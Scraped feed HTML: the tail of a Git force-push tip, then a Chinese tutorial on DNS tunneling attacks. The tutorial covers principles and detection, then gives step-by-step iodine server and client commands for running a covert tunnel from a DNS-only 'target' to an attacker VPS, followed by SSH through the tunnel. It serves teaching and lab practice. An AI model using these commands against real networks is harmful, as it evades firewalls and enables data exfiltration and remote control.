.contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 IDEA 中写完了新增各种工具类的代码，完成了 Commit 和 Push，代码已经到了 GitHub远程仓库。</p>
<p>继续写着下一个功能的代码，突然，我发现刚才的Commit Message少写了一个已经完成的功能实现。</p>
<p>此时，我的工作区里已经有正在修改但暂时还不想提交的文件：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef4b0bcc989547e9ae651606e2bcffb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWHVDb2Rlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879526&amp;x-signature=QgSTjV0%2BKJe751ZSld%2FzWb%2BiYas%3D" alt="" loading="lazy"/></p>
<p>于是，我使用了 IDEA 的<strong>修正提交</strong>功能，补全了信息，重新点击了 Commit：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c74dab738fe4f64bed0c8479e58e7a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWHVDb2Rlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879526&amp;x-signature=YVTuTVW48CBjH8LlI2FkuOzaaso%3D" alt="" loading="lazy"/></p>
<p>但是，当我再次点击 <strong>Push</strong> 时，出现了如下报错：</p>
<pre><code class="hljs language-bash" lang="bash">error: failed to push some refs to <span class="hljs-string">'github.com:xxx/xxx.git'</span>
!	refs/heads/main:refs/heads/main	[rejected] (non-fast-forward)
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart.
</code></pre>
<p>这个错误说人话就是：推送到远程被拒绝了！并且Git 提示你需要先 Pull。</p>
<h3 data-id="heading-0">原因分析</h3>
<p><strong>远程仓库</strong>保存着<strong>修改前</strong>的那次提交，我们把它记为 Commit A；</p>
<p><strong>本地仓库</strong>在我使用<strong>修正</strong>功能时，Git 并没有直接修改 Commit A，而是<strong>把 Commit A 扔掉了，生成了一个全新的 Commit A’</strong>，这个新的commit有着新的 Hash 值，新的备注。</p>
<p>当我点击 Push 时，远程仓库发现现在推送的 Commit A’ 和已有的 Commit A 对不上，为了防止覆盖代码，Git 默认拦截了这次推送。</p>
<h3 data-id="heading-1">解决方案</h3>
<p>本来我想使用 IDEA 的图形界面，但是，强制推送的按钮居然是灰色的，选不上。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27633a510cd64e888900ccc40bff292a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWHVDb2Rlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879526&amp;x-signature=lLAfqGe86SPJjp13NXhPBzRXN3s%3D" alt="" loading="lazy"/></p>
<p>所有，我使用命令行，在 IDEA 下方的 <strong>Terminal</strong> 中输入以下命令：</p>
<pre><code class="hljs language-bash" lang="bash">git push -f origin main
</code></pre>
<p>之后，就推送成功了。</p>
<h3 data-id="heading-2">小贴士</h3>
<ol>
<li>这样操作后，GitHub 上并不会多出一条记录，GitHub 上的记录会<strong>原地刷新</strong>。旧的提交（也就是少信息的那个）会被彻底删除，取而代之的是修改后的新提交。历史记录看起来非常干净，就像从来没有犯过错一样。</li>
<li>工作区里那个已修改但没勾选的文件不会受到任何影响，可以在下一次准备好时再提交。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DNS隧道（详细操作）]]></title>    <link>https://juejin.cn/post/7602916406981623849</link>    <guid>https://juejin.cn/post/7602916406981623849</guid>    <pubDate>2026-02-05T06:43:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602916406981623849" data-draft-id="7602900131541270569" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DNS隧道（详细操作）"/> <meta itemprop="keywords" content="黑客"/> <meta itemprop="datePublished" content="2026-02-05T06:43:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南瓜一族"/> <meta itemprop="url" content="https://juejin.cn/user/4496350807863529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DNS隧道（详细操作）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4496350807863529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南瓜一族
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:43:53.000Z" title="Thu Feb 05 2026 06:43:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、基本原理介绍</h2>
<p><strong>【DNS隧道】</strong>
DNS隧道攻击（DNS Tunneling Attack） 是一种利用 DNS 协议来进行数据传输的攻击方式。在这种攻击中，攻击者通过 DNS 请求和响应通道，绕过传统的网络防火墙和安全设备，进行数据传输、远程控制或者渗透攻击。由于 DNS 通常被用来进行域名解析，很多组织的防火墙允许 DNS 流量通过，因此攻击者利用这一点隐藏恶意流量。</p>
<p><strong>1. 基本原理</strong>
DNS 是一个用于将域名转换为 IP 地址的协议，但它也可以被滥用为数据通道，攻击者将网络数据嵌入到 DNS 请求或响应的域名中。这些数据通过互联网中的 DNS 服务器传输，最终到达攻击者的服务器，从而使得攻击者能够绕过防火墙。
<strong>工作流程：</strong>
数据嵌入： 攻击者将恶意数据或命令嵌入到 DNS 查询的子域名部分，例如，将数据编码成 base64 并作为查询请求的域名发送。例如，data1.attackersite.com 可能被转换成 data1.base64encoding.attackersite.com，将数据嵌入域名中。</p>
<p>DNS 查询： 客户端向 DNS 服务器发起查询，请求解析某个域名。在正常情况下，DNS 服务器会返回该域名的 IP 地址。</p>
<p>转发到攻击者： 攻击者设置自己的 DNS 服务器，将接收到的查询数据提取出来，并从中提取恶意数据。攻击者还可以将响应数据（例如：命令或文件）嵌入到 DNS 响应包中。</p>
<p>数据传输： 客户端收到 DNS 响应后，将嵌入其中的攻击者数据提取出来，从而实现数据的上传或下载。</p>
<p><strong>2. 攻击目标</strong></p>
<p>DNS 隧道攻击的目标通常是绕过防火墙或其他安全设备。因为大多数防火墙对 DNS 流量的检测较少，DNS 请求几乎总是被允许通过。攻击者通过以下方式利用这一点：</p>
<p>数据 exfiltration（数据外泄）： 将敏感信息从受害网络中传递到攻击者的控制服务器。</p>
<p>远程控制： 通过 DNS 隧道发送命令和接收结果，控制被感染的系统。</p>
<p>绕过安全检测： 将恶意流量包装在看似正常的 DNS 查询中，躲避传统防火墙和入侵检测系统（IDS）的检测。</p>
<p><strong>3. 攻击的实际应用</strong></p>
<p>DNS 隧道攻击不仅仅是恶意软件或黑客攻击的一部分，还可用于：</p>
<p>绕过企业防火墙：企业防火墙可能会阻止 HTTP、HTTPS 或其他协议的流量，但它们往往对 DNS 流量不作特别限制，攻击者可以利用这一点绕过防火墙。</p>
<p>网络渗透：攻击者通过 DNS 隧道在被攻击系统与外部的恶意服务器之间建立隐蔽的通信通道，从而避免被检测。</p>
<p>数据外泄：通过 DNS 隧道，攻击者可以将内部数据逐步地通过 DNS 请求发送到远程服务器，避免传统的数据泄露检测系统。</p>
<p><strong>4. 防范和检测方法</strong></p>
<ol>
<li>DNS 流量监控</li>
</ol>
<p>检测异常的 DNS 查询： DNS 隧道攻击往往会生成大量的 DNS 请求，这些请求的域名通常较长，并且频繁出现相似的模式。通过监控 DNS 查询，可以发现异常流量。</p>
<p>检查长域名或不常见的字符：通过分析 DNS 请求的长度和模式，可以识别出被用于 DNS 隧道的可疑请求。</p>
<ol start="2">
<li>DNS 策略</li>
</ol>
<p>限制外部 DNS 服务器访问：组织可以配置防火墙或路由器，只允许特定的 DNS 服务器进行解析，从而防止攻击者使用自定义的 DNS 服务器进行数据传输。</p>
<p>DNS over HTTPS（DoH）和 DNS over TLS（DoT）：加密的 DNS 协议可以防止 DNS 请求被窃听或篡改，但仍然无法完全阻止 DNS 隧道攻击。如果同时加密 DNS 请求并加以过滤，可以增加防范的难度。</p>
<ol start="3">
<li>DPI（深度包检测）</li>
</ol>
<p>深度包检测：一些先进的防火墙和入侵检测系统可以执行深度包检测，分析 DNS 流量中的内容，识别出可能隐藏的数据流。</p>
<ol start="4">
<li>频繁检测和响应</li>
</ol>
<p>DNS 请求速率：异常的 DNS 请求速率可能是 DNS 隧道活动的迹象。通过设置阈值来检测突发流量，可以及时发现潜在的隧道攻击。</p>
<ol start="5">
<li>访问控制和策略</li>
</ol>
<p>控制 DNS 查询：通过策略限制某些 DNS 查询操作（如不允许特定类型的子域名解析），可以减少 DNS 隧道的成功率。</p>
<p>数据加密：对传输数据进行加密，防止敏感信息通过 DNS 隧道泄露。</p>
<p><strong>5. 工具和技术</strong></p>
<p>以下是一些常见的 DNS 隧道攻击工具：</p>
<p>Iodine：一个常用的 DNS 隧道工具，它支持在 DNS 查询中嵌入 IP 流量，实现隧道通信。</p>
<p>DNSCat2：另一个常见的 DNS 隧道工具，能够通过 DNS 通道传输数据。</p>
<p>DNScapy：一个基于 Python 的 DNS 隧道工具，可以通过 DNS 通道进行数据交换。</p>
<h2 data-id="heading-1">二、使用Iodine进行DNS隧道</h2>
<h3 data-id="heading-2">a. 真实攻击的拓扑图</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ede7a86a99e41a1bf588b80e623f113~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=cNtPCgCzH9mlQO5OdTrg2ssZxp4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">b.前期准备清单</h3>






























<table><thead><tr><th align="left">项目</th><th align="left">要求</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left"><strong>公网 VPS</strong></td><td align="left">1台，公网IP（如 1.2.3.4），开放 UDP 53</td><td align="left">运行 iodined 服务端</td></tr><tr><td align="left"><strong>域名</strong></td><td align="left">1个（推荐 <code>.shop</code> <code>.xyz</code> <code>.top</code> 便宜域名）</td><td align="left">DNS 隧道伪装</td></tr><tr><td align="left"><strong>攻击机</strong></td><td align="left">1台（可以是服务端同一台）</td><td align="left">SSH 连接隧道</td></tr><tr><td align="left"><strong>目标机</strong></td><td align="left">1台（测试用，仅允许 DNS 出网）</td><td align="left">运行 iodine 客户端</td></tr></tbody></table>
<p>购买好域名后，将其IP指定攻击服务器（运行iodined服务端的公网IP）
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b212844099054f3cb7f65cf59fc5291e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=8DNuudJTz%2BixvAFsyGqW%2Fm%2Bn4gM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>配置完成后效果：</strong></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">验证 NS 记录是否生效（全球同步需 5-30 分钟）</span>
<span class="hljs-meta prompt_">$ </span><span class="bash">nslookup -<span class="hljs-built_in">type</span>=NS kennylin.shop</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">应该返回：</span>
<span class="hljs-meta prompt_"># </span><span class="bash">kennylin.shop   nameserver = ns1.kennylin.shop</span>
<span class="hljs-meta prompt_"># </span><span class="bash">kennylin.shop   nameserver = ns2.kennylin.shop</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">验证 ns1 的 IP</span>
<span class="hljs-meta prompt_">$ </span><span class="bash">nslookup ns1.kennylin.shop</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Address: 1.2.3.4</span>
</code></pre>
<h3 data-id="heading-4">c、VPS 服务端部署（iodined）</h3>
<h4 data-id="heading-5">Step 1：准备 VPS 环境</h4>
<p><strong>要求：</strong></p>
<ul>
<li>Ubuntu 20.04/22.04 / CentOS 7/8</li>
<li>公网 IP：假设为 <code>1.2.3.4</code></li>
<li>防火墙开放 <strong>UDP 53 端口</strong></li>
</ul>
<p><strong>购买推荐：</strong></p>
<ul>
<li>Vultr / DigitalOcean / AWS Lightsail / 阿里云 ECS</li>
<li>配置：1核1G 足够，月流量 1TB 左右</li>
</ul>
<hr/>
<h4 data-id="heading-6">Step 2：连接 VPS 并安装 iodine</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># SSH 登录你的 VPS</span>
ssh root@1.<span class="hljs-number">2.3</span>.<span class="hljs-number">4</span>

<span class="hljs-comment"># 更新系统（Ubuntu/Debian）</span>
apt update &amp;&amp; apt upgrade -<span class="hljs-keyword">y</span>

<span class="hljs-comment"># 安装 iodine</span>
apt install iodine -<span class="hljs-keyword">y</span>

<span class="hljs-comment"># CentOS/RHEL 安装方式：</span>
<span class="hljs-comment"># yum install epel-release -y</span>
<span class="hljs-comment"># yum install iodine -y</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbb1ccdd3ad941f9b2afb7400b27d9c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=GoJ3IJ0tsSW309Eb%2FWyxWMhQKrg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">Step 3：启动 iodined 服务端</h4>
<pre><code class="hljs language-r" lang="r"><span class="hljs-comment"># 创建虚拟网卡 dns0，分配隧道网段 192.168.200.0/24</span>
<span class="hljs-comment"># 服务端 IP: 192.168.200.1</span>
<span class="hljs-comment"># 客户端 IP: 192.168.200.2（自动分配）</span>

<span class="hljs-comment"># iodined -f -c -P Kenny123 -d dns0 192.168.200.1 ns.kennylin.shop</span>
iodined <span class="hljs-operator">-</span>f <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-operator">-</span>P Kenny123  <span class="hljs-number">192.168</span>.200.1 ns.kennylin.shop <span class="hljs-operator">-</span>DD

<span class="hljs-comment"># 参数说明：</span>
<span class="hljs-comment"># -f      前台运行（调试时，后台运行去掉 -f）</span>
<span class="hljs-comment"># -c      禁止检查客户端 IP（允许多个客户端或 NAT 环境）</span>
<span class="hljs-comment"># -P      认证密码（客户端必须一致）</span>
<span class="hljs-comment"># -d dns0 创建虚拟网卡 dns0</span>
<span class="hljs-comment"># 192.168.200.1  服务端隧道 IP</span>
<span class="hljs-comment"># ns.kennylin.shop  你的域名</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7c66a6f938745f2a04807e3b11a4a9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=00CLzt6Q0MokMbNOZCGkxvAa7Mo%3D" alt="image.png" loading="lazy"/></p>
<p><strong>后台运行方式（推荐--可跳过这个操作）：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用 nohup 或 screen</span>
nohup iodined -c -P Kenny123 -d dns0 192.168.200.1 ns.kennylin.shop &gt; /var/log/iodined.log 2&gt;&amp;1 &amp;

<span class="hljs-comment"># 或 systemd 服务（生产环境推荐）</span>
cat &gt; /etc/systemd/system/iodined.service &lt;&lt; 'EOF'
<span class="hljs-section">[Unit]</span>
<span class="hljs-attr">Description</span>=Iodine DNS Tunnel Server
<span class="hljs-attr">After</span>=network.target

<span class="hljs-section">[Service]</span>
<span class="hljs-attr">Type</span>=simple
<span class="hljs-attr">ExecStart</span>=/usr/bin/iodined -c -P Kenny123 -d dns0 <span class="hljs-number">192.168</span>.<span class="hljs-number">200.1</span> ns.kennylin.shop
<span class="hljs-attr">Restart</span>=always

<span class="hljs-section">[Install]</span>
<span class="hljs-attr">WantedBy</span>=multi-user.target
EOF

systemctl daemon-reload
systemctl enable iodined
systemctl start iodined
systemctl status iodined
</code></pre>
<hr/>
<h4 data-id="heading-8">Step 4：验证服务端运行（新建一个会话窗口）</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 查看进程</span>
ps aux | <span class="hljs-keyword">grep</span> iodine

<span class="hljs-comment"># 查看网卡</span>
ip addr show dns<span class="hljs-number">0</span>
<span class="hljs-comment"># 应该显示：192.168.200.1</span>

<span class="hljs-comment"># 查看监听端口</span>
ss -tunlp | <span class="hljs-keyword">grep</span> iodine
<span class="hljs-comment"># udp 0.0.0.0:53</span>

<span class="hljs-comment"># 测试本地 DNS 解析</span>
dig @127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> test.ns.kennylin.shop
<span class="hljs-comment"># 应该返回 iodine 的响应（不一定是真实IP，但会响应）</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f872a7f84ae46a2ac96ab80e369b524~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=PpaiMmtM8PGXq0bzD6xxWwmeVmE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6024fcbf11dd4a0c82e3cc4949e49dd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=vnPkT1vt%2FnsfTUrYhIsnrq5u8Yo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">d、目标机（客户端）部署</h3>
<h4 data-id="heading-10">Step 1：准备目标环境</h4>
<p><strong>模拟场景：</strong> 一台只能解析 DNS、无法直接出网的机器</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 iodine 客户端（Ubuntu/Debian）</span>
apt install iodine -y

<span class="hljs-comment"># CentOS</span>
yum install iodine -y
</code></pre>
<hr/>
<h4 data-id="heading-11">Step 2：连接 DNS 隧道</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方法 1：自动迭代解析（推荐，无需指定 DNS）</span>
iodine -f -P Kenny123 ns.kennylin.shop

<span class="hljs-comment"># 方法 2：强制通过特定 DNS 服务器（你之前用的方式，可能不稳定）--建议使用这个</span>
iodine -f -r -P Kenny123 223.5.5.5 ns.kennylin.shop

<span class="hljs-comment"># 参数说明：</span>
<span class="hljs-comment"># -f      前台运行</span>
<span class="hljs-comment"># -P      密码（必须与服务端一致）</span>
<span class="hljs-comment"># -r      递归模式，强制通过指定 DNS 查询</span>
<span class="hljs-comment"># 223.5.5.5  指定的 DNS 服务器（可选，不稳定）</span>
<span class="hljs-comment"># ns.kennylin.shop  域名</span>
</code></pre>
<h2 data-id="heading-12">📋 iodine 命令参数解析</h2>
<p>bash</p>
<p>复制</p>
<pre><code class="hljs language-css" lang="css">iodine -f -r -<span class="hljs-selector-tag">P</span> Kenny123 <span class="hljs-number">223.5</span>.<span class="hljs-number">5.5</span> ns<span class="hljs-selector-class">.kennylin</span><span class="hljs-selector-class">.shop</span>
</code></pre>
<p>表格</p>
<p>复制</p>

































<table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>-f</code></td><td align="left">前台运行（不守护进程化）</td></tr><tr><td align="left"><code>-r</code></td><td align="left"><strong>强制通过指定 DNS 服务器查询</strong>（recursive mode，递归模式）</td></tr><tr><td align="left"><code>-P Kenny123</code></td><td align="left">认证密码</td></tr><tr><td align="left"><code>223.5.5.5</code></td><td align="left"><strong>上游 DNS 服务器的 IP 地址</strong>（这里是阿里云 DNS）</td></tr><tr><td align="left"><code>ns.kennylin.shop</code></td><td align="left"><strong>iodine 服务端域名的前缀</strong>，完整的查询域名会是 <code>xxx.ns.kennylin.shop</code></td></tr><tr><td align="left"><strong>连接成功标志：</strong></td><td align="left"/></tr></tbody></table>
<pre><code class="hljs language-sql" lang="sql">Opened dns0
Version ok, <span class="hljs-keyword">both</span> <span class="hljs-keyword">using</span> protocol v <span class="hljs-number">0x00000502</span>. You <span class="hljs-keyword">are</span> <span class="hljs-keyword">user</span> #<span class="hljs-number">0</span>
Setting IP <span class="hljs-keyword">of</span> dns0 <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.2</span>
Server tunnel IP <span class="hljs-keyword">is</span> <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span>
Connection setup complete, transmitting data.
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c14b96d9ad05429f81230364bf8b1e65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=mQgYbx0IpE%2FjhWoVj17kvAJ8uv0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-13">e、攻击机连接隧道</h3>
<h4 data-id="heading-14">Step 1：SSH 通过隧道连接</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 在攻击机上（可以是服务端同一台机器）</span>
<span class="hljs-comment"># 直接连接客户端的隧道 IP</span>
ssh root@192.<span class="hljs-number">168.200</span>.<span class="hljs-number">2</span>

<span class="hljs-comment"># 或者如果客户端运行了 SSH 服务：</span>
ssh -p <span class="hljs-number">22</span> user@192.<span class="hljs-number">168.200</span>.<span class="hljs-number">2</span>
</code></pre>
<p><strong>如果iodine服务器和攻击机是同一台：</strong></p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 服务端已经有 dns0 网卡 192.168.200.1</span>
<span class="hljs-comment"># 直接访问客户端 192.168.200.2</span>

<span class="hljs-comment"># 测试连通性</span>
ping <span class="hljs-number">192.168</span>.<span class="hljs-number">200.2</span>

<span class="hljs-comment"># SSH 连接</span>
ssh root@192.<span class="hljs-number">168.200</span>.<span class="hljs-number">2</span>
</code></pre>
